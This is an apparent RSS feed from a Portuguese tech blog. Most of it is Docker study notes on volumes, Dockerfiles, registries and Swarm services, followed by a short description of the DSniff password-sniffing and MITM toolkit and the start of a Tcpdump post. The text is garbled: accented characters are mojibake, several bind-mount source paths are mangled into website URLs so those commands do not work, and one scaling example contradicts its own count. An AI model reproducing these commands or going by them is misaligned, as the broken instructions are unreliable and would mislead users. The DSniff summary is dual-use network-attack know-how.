root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# Posso colocar meus arquivos dentro da pasta _&amp;quot;data&amp;quot; que fica dentro da pasta do volume
root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# touch teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# Posso montar esse volume tamb√©m em um container, passando o tipo que agora n√£o ser√° tipo bind, mas sim volume
root@FXSHELL ~# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@4df1fe08b1da:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@4df1fe08b1da:/# cd moranguinho/ root@4df1fe08b1da:/moranguinho# ls teste1 teste2 teste3 root@4df1fe08b1da:/moranguinho# touch teste4_final Depois mato o container e vejo na pasta do volume, e eis o arquivo teste4_final est√° l√° dentro.
root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4983b4a108a3 debian &amp;#34;bash&amp;#34; 11 seconds ago Up 10 seconds frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@13aacd8dfd58:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@13aacd8dfd58:/# cd moranguinho/ root@13aacd8dfd58:/moranguinho# ls teste1 teste2 teste3 teste4_final root@13aacd8dfd58:/moranguinho# ‚èé root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 13aacd8dfd58 debian &amp;#34;bash&amp;#34; 14 seconds ago Up 12 seconds flamboyant_moore 4983b4a108a3 debian &amp;#34;bash&amp;#34; About a minute ago Up About a minute frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 13aacd8dfd58 touch /moranguinho/13aacd8dfd58 root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 4983b4a108a3 touch /moranguinho/4983b4a108a3 root@FXSHELL /v/l/d/v/g/_data# ls 13aacd8dfd58 4983b4a108a3 teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# Para remover o volume basta remover todos os containers que estiverem em uso com ele.
root@FXSHELL /v/l/d/v/g/_data [1]# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4df1fe08b1da debian &amp;#34;bash&amp;#34; 9 minutes ago Exited (0) 7 minutes ago zealous_tereshkova e779e386475a debian &amp;#34;bash&amp;#34; 21 minutes ago Exited (1) 20 minutes ago brave_meitner root@FXSHELL /v/l/d/v/g/_data# docker container rm -f 4df1fe08b1da 4df1fe08b1da root@FXSHELL /v/l/d/v/g/_data# docker container rm -f e779e386475a e779e386475a root@FXSHELL /v/l/d/v/g/_data# docker volume rm moranguinho moranguinho root@FXSHELL /v/l/d/v/g/_data# ls E assim dentro da pasta /var/lib n√£o temos mais nada do volume moranguinho.
Posso ver as propriedades do volume criado com o comando:
root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=bolacha,dst=/bolacha debian root@FXSHELL /v/l/d/v/g/_data [1]# docker container inspect 9d5997be4321 &amp;#34;Mounts&amp;#34;: [ { &amp;#34;Type&amp;#34;: &amp;#34;volume&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;bolacha&amp;#34;, &amp;#34;Source&amp;#34;: &amp;#34;/var/lib/docker/volumes/bolacha/_data&amp;#34;, &amp;#34;Destination&amp;#34;: &amp;#34;/bolacha&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Mode&amp;#34;: &amp;#34;z&amp;#34;, &amp;#34;RW&amp;#34;: true, &amp;#34;Propagation&amp;#34;: &amp;#34;&amp;#34; } Se dou um ls volume, o bolacha ainda estar√° l√°.
root@FXSHELL /v/l/d/v/g/_data# docker volume ls DRIVER VOLUME NAME local bolacha Posso utilizar o comando docker volume prune, para remover todos os volumes que estejam n√£o estejam sendo utilizados.
root@FXSHELL ~# docker volume prune WARNING! This will remove all local volumes not used by at least one container. Are you sure you want to continue? [y/N] y Deleted Volumes: bolacha Total reclaimed space: 0B Posso fazer a mesma coisa para os containers que n√£o estou utilizando mais.
root@FXSHELL ~# docker container prune WARNING! This will remove all stopped containers. Are you sure you want to continue? [y/N] y Deleted Containers: 9911369c74af20bcbf144e1487c326d3d06dd23a0293d7b561e54049f5ddbc56 c72d32bd0846e51a0cbd495909440ee14b64b474611b356704ee3170bf1931b7 07b30662ffc0b0068862768cd6d7c92eafc372d71f5dffc17baca8079cfadf59 ebb965d5043752debf60498d0eac5620ffaecc079af3b557c145539d3d721508 493a598735c5cb1ec6f658df0a4ad5b157562cb462789d19521f1d1fcccbc5fc acda8e5ec1adaaf1f2632be1fa8c2d6aedf9744be643991fea48d0d310fc3150 d7a861d6ea3811ed0273ac32ada6744a26ec85e14ff3b6c6ff5e3462004c3216 bcee760fd5702bb215b99da66109a3a59158aa5a47aae437d7ff4b516f93c38c 3d7c4a379d3e3d6a6710d581034d6199002942990f7d34ae5cb97617dd98ef32 2c6bcccf8f1727817a5da2c9b59edb7afdbb0790e3b3ba16a6298448d3cbb5a6 d21df8a6681620d956610f5e6808b21a0cd960d3c5a5c88da767b39efec4b674 ea431a856eff6fd17ff13d87ae498bfe91fb61fe6566744a528f62c1731689b5 8f88a55195f7defa35196f1d506a1d179af0099afbfcb34a9fd7fefef78240b6 40ab9db51e4a8c6e5603bdb51c60f37925e89d60afab8bda1ddf06071cb06ecc Total reclaimed space: 870.3MB root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# Assim limpando tudo.
Agora um outro teste
root@FXSHELL ~# docker container create -v /opt/bolacha:/data --name dbdados centos 49eeb1ffb2453b206028478bc24f13582f5c1cb2ed2dbb378702ea10a7c5fb0c Com isso, apenas criamos o container e especificamos um volume para ele, mas ainda n√£o o iniciamos.
Sabemos que no container o volume se encontra montado em &amp;ldquo;/data&amp;rdquo;.
Agora vamos criar os containers que rodar√£o o Postgresql utilizando o volume &amp;ldquo;/data&amp;rdquo; do container &amp;ldquo;dbdados&amp;rdquo; para guardar os dados.
Para isso precisamos entender dois par√¢metros importantes:
&amp;ndash;volume-from : √â utilizado quando queremos montar um volme disponibilizado por outro container.
-e : √â utilizado para informar v√°riaveis de um ambiente para o container. No exemplo, estamos passando as vari√°veis de ambiente do PostgreSQL.
root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql Criei duas.
root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 79e408793331 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 8 seconds ago Up 7 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 2c2161d46619 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 6 minutes ago Up 6 minutes 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 49eeb1ffb245 centos &amp;#34;/bin/bash&amp;#34; 10 minutes ago Created dbdados root@FXSHELL ~# Fazendo da forma nova e atualizada:
root@FXSHELL ~# docker volume create dbdados dbdados root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 1fbdf3f70d206cebb44049c737e2d08359118df654bcf9481a5a46c99ab47ccc root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 368bc32d8ca3203dd8962ced0a6a4b999f56751462f121d3100c00169e43e4a8 root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 368bc32d8ca3 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 5 seconds ago Up 3 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 1fbdf3f70d20 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 16 seconds ago Up 14 seconds 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local dbdados root@FXSHELL ~# E assim os dados do postgreSQL est√£o la dentro:
root@FXSHELL ~# cd /var/lib/docker/volumes/dbdados/_data root@FXSHELL /v/l/d/v/d/_data# ls base/ pg_multixact/ pg_stat_tmp/ pg_xlog/ server.key@ global/ pg_notify/ pg_subtrans/ postgresql.conf pg_clog/ pg_serial/ pg_tblspc/ postmaster.opts pg_hba.conf pg_snapshots/ pg_twophase/ postmaster.pid pg_ident.conf pg_stat/ PG_VERSION server.crt@ root@FXSHELL /v/l/d/v/d/_data# Supondo que quero fazer um backup deste cara, e encarrego outro container de fazer isso, posso fazer algo assim:
root@FXSHELL ~# mkdir /opt/backup root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# docker container run -ti --mount type=volume,src=dbdados,dst=/data --mount type=bind,src=https://fxshelll.github.io/opt/backup,dst=/backup debian tar -cvf /backup/bkp-banco.tar /data montando um volume do tipo bind dentro deste novo container e empacotando com o tar, o bkp.
#EXEMPLO DE COMANDOS
# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/volume,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=https://fxshelll.github.io/root/primeiro_container,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=https://fxshelll.github.io/root/primeiro_container,dst=/volume,ro ubuntu # docker volume create moranguinho # docker volume rm moranguinho # docker volume inspect moranguinho # docker volume prune # docker container run -d --mount type=volume,source=moranguinho,destination=/var/opa nginx # docker container create -v /data --name dbdados centos # docker run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -ti --volumes-from dbdados -v $(pwd):/backup debian tar -cvf /backup/backup.tar /data #Criando um dockerfile
$ vim dockerfiles/1/Dockerfile
FROM debian #qual imagem vou me basear RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean #executa oque vai fazer ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; #Variavel de ambiente para n√£o ter dois apache rodando ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; #Variavel de ambiente de identifica√ß√£o do processo ENV APACHE_RUN_USER=&amp;#34;www.data&amp;#34; #Variavel de ambiente usu√°rio respons√°vel pelo apache ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; #Variavel de ambiente grupo respons√°vel pelo apache ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; #onde vai salvar os logs do apache LABEL description=&amp;#34;Webserver&amp;#34; #faz uma descri√ß√£o (qualquer chave=valor) LABEL version=&amp;#34;1.0.0&amp;#34; VOLUME /var/www/html #docker vai criar automaticamente esse volume EXPOSE 80 #com a flag -P ir√° pegar o expose qualquer porta = 80 Para criar o container eu fa√ßo um docker build.
root@FXSHELL ~# docker build . ou root@FXSHELL ~# docker image build -t meu_apache:1.0 . #Exemplos de Dockerfiles
FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_DIR=&amp;#34;/var/run/apache2&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 ENTRYPOINT [&amp;#34;/usr/sbin/apachectl&amp;#34;] CMD [&amp;#34;-D&amp;#34;, &amp;#34;FOREGROUND&amp;#34;] package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;GIROPOPS STRIGUS GIRUS - LINUXTIPS&amp;#34;) } FROM golang WORKDIR /app ADD . /app RUN go build -o goapp ENTRYPOINT ./goapp FROM golang AS buildando ADD . /src WORKDIR /src RUN go build -o goapp FROM alpine:3.1 WORKDIR /app COPY --from=buildando /src/goapp /app ENTRYPOINT ./goapp ADD =&amp;gt; Copia novos arquivos, diret√≥rios, arquivos TAR ou arquivos remotos e os adicionam ao filesystem do container;
CMD =&amp;gt; Executa um comando, diferente do RUN que executa o comando no momento em que est√° &amp;ldquo;buildando&amp;rdquo; a imagem, o CMD executa no in√≠cio da execu√ß√£o do container;
LABEL =&amp;gt; Adiciona metadados a imagem como vers√£o, descri√ß√£o e fabricante;
COPY =&amp;gt; Copia novos arquivos e diret√≥rios e os adicionam ao filesystem do container;
ENTRYPOINT =&amp;gt; Permite voc√™ configurar um container para rodar um execut√°vel, e quando esse execut√°vel for finalizado, o container tamb√©m ser√°;
ENV =&amp;gt; Informa vari√°veis de ambiente ao container;
EXPOSE =&amp;gt; Informa qual porta o container estar√° ouvindo;
FROM =&amp;gt; Indica qual imagem ser√° utilizada como base, ela precisa ser a primeira linha do Dockerfile;
MAINTAINER =&amp;gt; Autor da imagem;
RUN =&amp;gt; Executa qualquer comando em uma nova camada no topo da imagem e &amp;ldquo;commita&amp;rdquo; as altera√ß√µes. Essas altera√ß√µes voc√™ poder√° utilizar nas pr√≥ximas instru√ß√µes de seu Dockerfile;
USER =&amp;gt; Determina qual o usu√°rio ser√° utilizado na imagem. Por default √© o root;
VOLUME =&amp;gt; Permite a cria√ß√£o de um ponto de montagem no container;
WORKDIR =&amp;gt; Respons√°vel por mudar do diret√≥rio / (raiz) para o especificado nele;
Um Dockerfile serve para criar uma imagem de um container
A finalidade da instru√ß√£o FROM no Dockerfile √© para indicar uma imagem base
Para &amp;ldquo;buildar&amp;rdquo; uma nova imagem, utilizo o comando, &amp;lsquo;docker build -t nomedaimagem:1.0 .&amp;rsquo;
As instru√ß√µes para que o Dockerfile adicione um arquivo, s√£o &amp;lsquo;ADD&amp;rsquo; ou &amp;lsquo;COPY&amp;rsquo;
No momento de cria√ß√£o da imagem o Dockerfile executa o comando &amp;lsquo;RUN&amp;rsquo;
Os comandos que executam um comando na inicializa√ß√£o do container s√£o &amp;lsquo;ENTRYPOINT&amp;rsquo; ou &amp;lsquo;CMD&amp;rsquo;
A instru√ß√£o que indica qual usu√°rio que ser√° utilizado no container √© o &amp;lsquo;USER&amp;rsquo;
Indica que determinado diret√≥rio no container ser√° um volume com o comando &amp;lsquo;VOLUME&amp;rsquo;
√â poss√≠vel ter duas instru√ß√µes FROM dentro do mesmo Dockerfile.
Para referenci√°-lo em outra parte do arquivo utilizo o &amp;lsquo;FROM debian AS giropops&amp;rsquo;
Para listar todas as imagens do container eu fa√ßo &amp;lsquo;docker image ls&amp;rsquo;
√â poss√≠vel criar uma imagem a partir de um container em execu√ß√£o.
Com o comando &amp;ldquo;docker commit&amp;rdquo; eu crio uma imagem apartir de um container em execu√ß√£o.
**
#SUBINDO UMA IMAGEM PARA SUA CONTA DO DOCKERHUB
root@FXSHELL ~/d/2# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 6 minutes ago 267MB ubuntu latest f63181f19b2f 12 days ago 72.9MB root@FXSHELL ~/d/2# docker login Authenticating with existing credentials... WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded root@FXSHELL ~/d/2# docker push fpmatta/toddy:1.0 The push refers to repository [docker.io/fpmatta/toddy] b43d9cffa997: Pushing [==============================================&amp;gt; ] 178.2MB/193.7MB 02473afd360b: Mounted from library/ubuntu dbf2c0f42a39: Preparing 9f32931c9d28: Preparing #N√£o confio na internet; posso criar o meu registry local
Subindo o registry local:
root@FXSHELL ~# docker container run -d -p 5000:5000 --restart=always --name registry registry:2 Consigo ver o container do registry rodando bem como sua imagem.
root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc‚Ä¶&amp;#34; 34 seconds ago Up 32 seconds 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# Preciso retagear o nome da minha imagem, passando o meu registry local que no caso √© o &amp;rsquo;localhost:5000&amp;rsquo;
root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker tag e1c0c1113bca localhost:5000/fpmatta/toddy:1.0 root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB localhost:5000/fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker image push localhost:5000/fpmatta/toddy:1.0 The push refers to repository [localhost:5000/fpmatta/toddy] b43d9cffa997: Pushing [==================================================&amp;gt;] 199.9MB 02473afd360b: Pushed dbf2c0f42a39: Pushed 9f32931c9d28: Pushed Para checar sua imagem dentro do registry fica no caminho abaixo:
/var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a3c92b51fe5b localhost:5000/fpmatta/toddy:1.0 &amp;#34;/bin/bash&amp;#34; 13 minutes ago Up 13 minutes exciting_heyrovsky 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc‚Ä¶&amp;#34; 30 minutes ago Up 30 minutes 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker exec -ti 49fbebd0365b sh / # ls bin entrypoint.sh home media opt root sbin sys usr dev etc lib mnt proc run srv tmp var / # cd /var/ cache/ empty/ lib/ local/ lock/ log/ mail/ opt/ run/ spool/ tmp/ / # cd /var/lib/ apk/ misc/ registry/ udhcpd/ / # cd /var/lib/registry/docker/registry/v2/ /var/lib/registry/docker/registry/v2 # ls blobs repositories /var/lib/registry/docker/registry/v2 # cd repositories/ /var/lib/registry/docker/registry/v2/repositories # ls fpmatta /var/lib/registry/docker/registry/v2/repositories # cd fpmatta/ /var/lib/registry/docker/registry/v2/repositories/fpmatta # ls toddy /var/lib/registry/docker/registry/v2/repositories/fpmatta # cd toddy/ /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy # ls _layers _manifests _uploads /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy # #DockerHub e Registry - Exemplo comandos docker image inspect debian
docker history linuxtips/apache:1.0
docker login
docker login registry.suaempresa.com
docker push linuxtips/apache:1.0
docker pull linuxtips/apache:1.0
docker image ls
docker container run -d -p 5000:5000 &amp;ndash;restart=always &amp;ndash;name registry registry:2
docker tag IMAGEMID localhost:5000/apache
Docker Machine Para fazer a instala√ß√£o do Docker Machine no Linux, fa√ßa:
# curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/tmp/docker-machine # chmod &#43;x /tmp/docker-machine # sudo cp /tmp/docker-machine /usr/local/bin/docker-machine Para seguir com a instala√ß√£o no macOS: # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/usr/local/bin/docker-machine # chmod &#43;x /usr/local/bin/docker-machine Para seguir com a instala√ß√£o no Windows caso esteja usando o Git bash: # if [[ ! -d &amp;#34;$HOME/bin&amp;#34; ]]; then mkdir -p &amp;#34;$HOME/bin&amp;#34;; fi # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-Windows-x86_64.exe &amp;gt; &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; # chmod &#43;x &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; Para verificar se ele foi instalado e qual a sua vers√£o, fa√ßa: # docker-machine version # docker-machine create --driver virtualbox linuxtips # docker-machine ls # docker-machine env linuxtips # eval &amp;#34;$(docker-machine env linuxtips)&amp;#34; # docker container ls # docker container run busybox echo &amp;#34;LINUXTIPS, VAIIII&amp;#34; # docker-machine ip linuxtips # docker-machine ssh linuxtips # docker-machine inspect linuxtips # docker-machine stop linuxtips # docker-machine ls # docker-machine start linuxtips # docker-machine rm linuxtips # eval $(docker-machine env -u) Docker Swarm Voc√™ consegue construir clusters de containers com caracateristicas importantes como balanceador de cargas e failover.
Para criar um clustercom o docker swarm, basta indicar quais os hosts que ele ir√° supervisionar e o restante √© com ele.
Cuida automaticamente do balanceamento de carga.
O Docker Swarm √© bastante simples e se resume a um manager e diversos workers. O manager √© o responsavel por orquestrar os containers e distribui-los entre os hosts workers. Os workers s√£o os que carregam o piano, e hospedam os containers.
Worker = Container em execu√ß√£o
Manager = Conhece os detalhes do cluster, sabe todos os containers e servi√ßos.
Para testar, podemos subir tr√™s maquinas e instalar o docker em cada uma delas.
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Feito isso, basta rodar na maquina 01, o comando:
docker swarm init Ser√° gerado um token, que iremos utilizar e rodar nas maquinas do node, que ser√£o as maquinas 02 e 03.
Depois podera visualizar na maquina manager, todos os nodes que est√£o adicionados com o comando:
docker node ls Para visualizar o token da maquina 02 para adiciona-la commo manager e n√£o como worker, basta fazer:
docker swarm join-token manager Com isso ser√° exibido o token de manager, para ser executado no seu outro host.
Mesma coisa caso fosse um worker
docker swarm join-token worker Para promover um node worker para manager basta fazer:
docker node promote maquina-02 docker node demote maquina-02 Agora se voc√™ quiser remover o node do cluster basta digitar o comando:
docker swarm leave Tamb√©m remova ele do nosso manager ativo, com o comando
docker node rm maquina-02 Para remover um node manager, √© necess√°rio for√ßar com a flag &amp;ndash;force
docker swarm leave --force E depois remover do node manager
docker node rm maquina-03 Docker Services O service √© um VIP ou DNS que realizara o balanceamento de requisi√ß√µes entre os containers. Podemos estabelecer um numero x de containers respondendo por um service e esses containers estar√£o espalhados pelo nosso cluster, entre nossos nodes, garantindo alta disponibilidade e balanceamento de carga. Tudo isso nativamente.
Os services √© uma forma, j√° utlizada no kubernetes, de voc√™ conseguir gerenciar melhor seus containers. Tamb√©m uma maneira muito simples e efetiva para escalar seu ambiente. Aumentando ou diminuindo a quantidade de containers que responder√° para determinado service.
Exemplo:
Nome do service que desejo criar: webserver
Quantidade de containers que desejo debaixo do service: 5
Portas que iremos blindar, entre o service e o node: 8080:80
Imagem dos containers que irei utilizar: NGINX
O comando ficaria assim =&amp;gt;
docker service create --name webserver --replicas 5 -p 8080:80 nginx Para testar fa√ßa um curl em qualquer ip dos nodes que subiu:8080
Para listar os services fa√ßa
docker service ls Se quisermos saber onde est√£o rodando nossos containers, em quais nodes eles est√ßao sendo executados, basta digitar o seguinte comando:
docker service ps webserver Assim conseguiremos saber onde est√° rodando cada container e ainda o seu status.
Se precisamos saber maiores detalhes sobre o service, basta utlizar o subcomando &amp;ldquo;inspect&amp;rdquo;.
docker service inspect webserver Na sa√≠da do &amp;ldquo;inspect&amp;rdquo; conseguiremos pegar informa√ß√µes importantes sobre nosso service, como portas expostas, volumes, containers, limita√ß√µes, entre outras coisas.
Lembre-se meu cen√°rio de nodes √©:
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Posso ter muitas replicas divididas e distribuidas e balanceadas nesses 3 nodes.
Uma informa√ß√£o muito importante √© o endere√ßo do VIP do service, que estara listado no comando &amp;ldquo;insepect&amp;rdquo;.
Esse √© o endere√ßo do IP do balanceador desse service, ou seja, sempre que acessarem via esse IP, ele distribuir√° a conex√£o entre os containers.
Agora se quisermos aumentar o n√∫mero de containers debaixo desse service, √© muito simples. Basta executar o comando a seguir:
docker service scale webserver=5 Pronto, agora temos dez containers respondendo requisi√ß√µes debaido do nosso service webserver.
Para visualizar basta executar:
docker service ls Ah n√£o quero que um determinado node receba mais containers, posso dar um pause neste cara, com o comando abaixo:
docker node update --availability pause FXSHELL-02 Para ativa-lo novamente:
docker node update --availability active FXSHELL-02 Para retirar temporariamente um node para manuten√ß√£o por exemplo, fa√ßa:
docker node update --availability drain FXSHELL-02 Todos os containers que estavam no FXSHELL-02, v√£o ser realocados para os outros 2.
Para visualizar basta executar:
docker service ps webserver Para saber em quais nodes eseles est√£o em execu√ß√£o, lembre-se do &amp;lsquo;docker service ls webserver&amp;rsquo;
Para acessar os logs desse service, basta digitar:
docker service logs -f webserver Assim voc√™ ter√° acesso aos logs de todos os containers desse service.
Para remover o service √© simples
docker service rm webserver Voc√™ pode checar com o comando
docker service ls Criar um service com um volume conectado √© bastante simples, basta fazer:
docker service create --name webserver --replicas 5 -p 8080:80 --mount type=volume,src=teste,dst=/app, nginx Quando criamos um service com um volume conectado a ele, isso indica que esse volume estar√° disponivel em todos os nossos containers desse service, ou seja, o volume com o nome de &amp;ldquo;teste&amp;rdquo; estara montado em todos os containers no diretorio &amp;ldquo;/app&amp;rdquo;.
Exemplo de como ficou:
Docker Secrets! ]]></content:encoded>
    </item>
    <item>
      <title>DSniff</title>
      <link>https://fxshelll.github.io/posts/dsniff/</link>
      <pubDate>Wed, 30 Sep 2020 23:59:51 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/dsniff/</guid>
      <description>DSniff
O DSniff √© um conjunto de ferramentas para auditoria de redes, que tamb√©m poder√° ser √∫til para aplica√ß√µes forenses. Algumas das principais ferramentas dessa su√≠te s√£o:
DSniff: sniffer de senhas que suporta os protocolos FTP, Telnet, SMTP, HTTP e POP, dentre muitos outros.
Filesnarf: ferramenta para extra√ß√£o de arquivos trafegados pelo protocolo NFS.
Mailsnarf: ferramenta para extra√ß√£o de e-mails trafegados pelos protocolos SMTP e POP.
DNSspoof: ferramenta para envio de respostas falsas a requisi√ß√µes DNS, auxiliando em ataques MITM.</description>
      <content:encoded><![CDATA[DSniff
O DSniff √© um conjunto de ferramentas para auditoria de redes, que tamb√©m poder√° ser √∫til para aplica√ß√µes forenses. Algumas das principais ferramentas dessa su√≠te s√£o:
DSniff: sniffer de senhas que suporta os protocolos FTP, Telnet, SMTP, HTTP e POP, dentre muitos outros.
Filesnarf: ferramenta para extra√ß√£o de arquivos trafegados pelo protocolo NFS.
Mailsnarf: ferramenta para extra√ß√£o de e-mails trafegados pelos protocolos SMTP e POP.
DNSspoof: ferramenta para envio de respostas falsas a requisi√ß√µes DNS, auxiliando em ataques MITM.
SSHmitm: ferramenta para execu√ß√£o de ataques MITM em conex√µes SSH (vers√£o 1, exclusivamente), permitindo a captura de senhas e sequestro da sess√£o.
]]></content:encoded>
    </item>
    <item>
      <title>Tcpdump</title>
      <link>https://fxshelll.github.io/posts/tcpdump/</link>
      <pubDate>Wed, 30 Sep 2020 23:58:47 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/tcpdump/</guid>
      <description>TCPDump
O TCPDump funciona em linha de comando, para captura e an√°lise de pacotes. J√° vem instalado por padr√£o em diversas distribui√ß√µes Linux, foi tamb√©m portado para o Windows com o nome de Windump. O TCPDump prov√™ uma interface de usu√°rio para a intera√ß√£o com a LibPcap, biblioteca amplamente utilizada por sniffers open source, que atua diretamente no driver da placa de rede para possibilitar a captura de pacotes.
# tcpdump</description>
